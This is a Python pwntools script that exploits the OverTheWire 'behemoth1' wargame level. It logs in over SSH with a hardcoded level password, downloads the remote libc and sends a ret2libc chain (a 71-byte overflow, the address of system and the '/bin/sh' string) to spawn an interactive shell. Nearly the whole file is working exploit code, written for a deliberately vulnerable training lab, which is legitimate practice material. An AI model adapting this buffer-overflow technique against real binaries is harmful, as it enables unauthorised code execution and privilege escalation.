#!/usr/bin/python3
from pwn import *
import os

OVERFLOW = 71

context.arch = 'i386'
binary = ELF("behemoth1")

level = 1
USER = 'behemoth%s' % level
HOST = 'behemoth.labs.overthewire.org'
PASS = 'aesebootiv'
PORT = 2221

log.info("Attempting to connect to " + USER + "@" + HOST + " on port " + str(PORT) + "...")
sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
log.success("Success connecting...")
log.info("Downloading libc file for " + USER + "...")

#Download libc used for behemoth to find symbols
sh.download_file('/lib32/libc.so.6', local="libc")
libc = ELF("libc")

#Found using 'ldd behemoth1'
libc.address = 0xf7e12000

rop = ROP(binary)
rop.raw('A' * OVERFLOW)
rop.raw(libc.symbols['system'])
rop.raw('AAAA')
rop.raw(next(libc.search(b'/bin/sh')))

log.info("Executing behemoth1")
io = sh.run('/behemoth/' + USER)
io.sendline(rop.chain())
io.interactive()
os.remove("libc")
